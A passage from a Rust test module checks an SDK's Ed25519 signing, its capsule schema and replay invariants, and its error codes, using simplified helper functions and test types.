                "Generated verifying key should be valid Ed25519 material"
            );

            // Test 2: Public key derivation consistency
            let public_key1 = VerifyingKey::from(&signing_key);
            let public_key2 = VerifyingKey::from(&signing_key);
            assert_eq!(
                public_key1.as_bytes(),
                public_key2.as_bytes(),
                "Public key derivation should be consistent"
            );

            // Test 3: Signature generation and verification
            let test_data = b"test signature data";
            let signature = signing_key.sign(test_data);

            assert!(
                public_key.verify_strict(test_data, &signature).is_ok(),
                "Signature should verify with correct key"
            );

            // Test 4: Cross-key signature verification failure
            let other_signing_key = SigningKey::from_bytes(&[10_u8; 32]);
            let other_public_key = VerifyingKey::from(&other_signing_key);
            assert!(
                other_public_key
                    .verify_strict(test_data, &signature)
                    .is_err(),
                "Signature should fail verification with wrong key"
            );

            // Test 5: Key serialization and deserialization
            let public_key_bytes = public_key.as_bytes();
            assert_eq!(
                public_key_bytes.len(),
                32,
                "Ed25519 public key should be 32 bytes"
            );

            let restored_public_key = VerifyingKey::from_bytes(public_key_bytes);
            assert!(
                restored_public_key.is_ok(),
                "Public key should restore from valid bytes"
            );
        }

        #[test]
        fn conformance_invariant_validation_coverage() {
            // Test 1: Schema stability invariant
            let test_capsule = create_test_capsule();
            assert!(
                validate_capsule_schema_stability(&test_capsule).is_ok(),
                "INV-CAPSULE-STABLE-SCHEMA: Schema must be stable"
            );

            // Test 2: Versioned API invariant
            assert!(
                validate_versioned_api_coverage().is_ok(),
                "INV-CAPSULE-VERSIONED-API: All APIs must carry version"
            );

            // Test 3: No privileged access invariant
            assert!(
                validate_no_privileged_access_required().is_ok(),
                "INV-CAPSULE-NO-PRIVILEGED-ACCESS: No privileged access required"
            );

            // Test 4: Verdict reproducibility invariant
            let capsule = create_test_capsule();
            let verdict1 =
                replay_capsule_for_verdict(&capsule).expect("First replay should succeed");
            let verdict2 =
                replay_capsule_for_verdict(&capsule).expect("Second replay should succeed");

            assert_eq!(
                verdict1, verdict2,
                "INV-CAPSULE-VERDICT-REPRODUCIBLE: Verdicts must be reproducible"
            );
        }

        #[test]
        fn conformance_error_handling_consistency() {
            // Test 1: Error code usage in actual error scenarios
            let error_scenarios = vec![
                (ERR_CAPSULE_SIGNATURE_INVALID, "invalid signature scenario"),
                (ERR_CAPSULE_SCHEMA_MISMATCH, "schema mismatch scenario"),
                (ERR_CAPSULE_REPLAY_DIVERGED, "replay divergence scenario"),
                (ERR_CAPSULE_VERDICT_MISMATCH, "verdict mismatch scenario"),
                (ERR_SDK_VERSION_UNSUPPORTED, "unsupported version scenario"),
                (ERR_CAPSULE_ACCESS_DENIED, "access denied scenario"),
            ];

            for (error_code, scenario_desc) in error_scenarios {
                let result = simulate_error_scenario(error_code, scenario_desc);
                match result {
                    Err(sdk_error) => {
                        assert!(
                            sdk_error.error_code() == error_code,
                            "Error scenario '{}' should produce error code '{}'",
                            scenario_desc,
                            error_code
                        );
                    }
                    Ok(_) => {
                        // Some scenarios might not be easily simulatable - that's okay
                        // The important thing is the error codes exist and are well-formed
                    }
                }
            }

            // Test 2: Error message quality
            let test_error = SdkError::new(
                ERR_CAPSULE_SIGNATURE_INVALID.to_string(),
                "Test signature verification failed".to_string(),
            );

            assert!(
                !test_error.message().is_empty(),
                "Error message must not be empty"
            );
            assert!(
                test_error.message().len() <= 1024,
                "Error message must be bounded in length"
            );
            assert!(
                test_error.error_code() == ERR_CAPSULE_SIGNATURE_INVALID,
                "Error code must be preserved"
            );
        }

        // Helper functions for conformance tests
        fn is_valid_version_format(version: &str) -> bool {
            version.starts_with("vsdk-v")
                && version.len() >= 7
                && version
                    .chars()
                    .skip(6)
                    .all(|c| c.is_ascii_digit() || c == '.')
        }

        fn is_valid_event_code_format(code: &str) -> bool {
            !code.is_empty()
                && code.chars().all(|c| c.is_ascii_uppercase() || c == '_')
                && !code.starts_with('_')
                && !code.ends_with('_')
        }

        fn is_valid_error_code_format(code: &str) -> bool {
            code.starts_with("ERR_")
                && code.len() > 4
                && code.chars().all(|c| c.is_ascii_uppercase() || c == '_')
        }

        fn is_valid_rule_id_format(rule_id: &str) -> bool {
            rule_id.contains("::")
                && rule_id
                    .chars()
                    .all(|c| c.is_ascii_uppercase() || c == '_' || c == ':')
        }

        fn is_version_compatible(min_version: &str, current_version: &str) -> bool {
            // Simplified version comparison
            min_version <= current_version
        }

        fn check_version_compatibility(version1: &str, version2: &str) -> Result<(), &'static str> {
            if !is_valid_version_format(version1) || !is_valid_version_format(version2) {
                return Err("Invalid version format");
            }
            if is_version_compatible(version1, version2) {
                Ok(())
            } else {
                Err("Version incompatible")
            }
        }

        fn create_test_capsule() -> TestCapsule {
            TestCapsule {
                id: "test-capsule-001".to_string(),
                version: SDK_VERSION.to_string(),
                data: vec![1, 2, 3, 4, 5],
            }
        }

        fn validate_capsule_schema_stability(capsule: &TestCapsule) -> Result<(), &'static str> {
            if capsule.id.is_empty() {
                return Err("Capsule id missing");
            }
            if !is_valid_version_format(&capsule.version) {
                return Err("Capsule version invalid");
            }
            Ok(())
        }

        fn validate_versioned_api_coverage() -> Result<(), &'static str> {
            // Check that all major API surfaces have version identifiers
            if SDK_VERSION.is_empty() || SDK_VERSION_MIN.is_empty() {
                return Err("Version constants missing");
            }
            Ok(())
        }

        fn validate_no_privileged_access_required() -> Result<(), &'static str> {
            // Verify that the SDK can operate without privileged access
            Ok(())
        }

        fn replay_capsule_for_verdict(capsule: &TestCapsule) -> Result<TestVerdict, &'static str> {
            // Simplified capsule replay
            Ok(TestVerdict {
                capsule_id: capsule.id.clone(),
                result: "PASS".to_string(),
                hash: calculate_test_hash(&capsule.data),
            })
        }

        fn simulate_error_scenario(error_code: &str, _scenario: &str) -> Result<(), SdkError> {
            // Simplified error scenario simulation
            match error_code {
                ERR_CAPSULE_SIGNATURE_INVALID => Err(SdkError::new(
                    error_code.to_string(),
                    "Simulated signature verification failure".to_string(),
                )),
                _ => Ok(()), // Other scenarios not easily simulatable
            }
        }

        fn calculate_test_hash(data: &[u8]) -> String {
            use sha2::Sha256;
            let mut hasher = Sha256::new();
            hasher.update(data);
            hex::encode(hasher.finalize())
        }

        // Test helper types
        #[derive(Debug, Clone)]
        struct TestCapsule {
            id: String,
            version: String,
            data: Vec<u8>,
        }

        #[derive(Debug, Clone, PartialEq)]
        struct TestVerdict {
            capsule_id: String,
            result: String,
            hash: String,
        }

        #[derive(Debug)]
        struct SdkError {
            code: String,
            message: String,
        }

        impl SdkError {
            fn new(code: String, message: String) -> Self {
                Self { code, message }
            }

            fn error_code(&self) -> &str {
                &self.code
            }

            fn message(&self) -> &str {
                &self.message
            }
        }
    }
}
